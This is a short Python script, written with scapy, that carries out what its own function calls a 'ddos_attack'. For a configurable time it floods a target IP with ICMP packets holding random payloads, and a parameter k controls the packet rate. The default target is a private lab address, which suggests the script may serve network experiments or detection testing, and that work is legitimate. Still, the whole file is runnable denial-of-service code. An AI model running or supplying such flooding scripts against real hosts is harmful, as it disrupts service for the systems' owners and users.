#!/usr/bin/env python3
from scapy.all import *
import random
import string
import argparse

from scapy.layers.inet import IP, ICMP


def send_packet(dst_ip):
    # Generate random content
    print(dst_ip)
    random_content = ''.join(random.choices(string.ascii_letters + string.digits, k=64))
    att_packet = IP(dst=dst_ip) / ICMP() / random_content
    send(att_packet)


def ddos_attack(ip_addr, attack_time, k):
    start_time = time.time()
    while True:
        if time.time() - start_time > attack_time:
            break
        send_packet(ip_addr)
        # define the function as f(k) = exp(-k/10)
        time.sleep(math.exp(-k/10))


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    # --ip_addr: server ip address, --k: parameter K, typically 0-10. --attack_time:
    parser.add_argument("--ip_addr", type=str, default='10.0.0.21')
    parser.add_argument("--attack_time", type=int, default=10)
    parser.add_argument("--k", type=int, default=0)
    args = parser.parse_args()
    ddos_attack(args.ip_addr, args.attack_time, args.k)

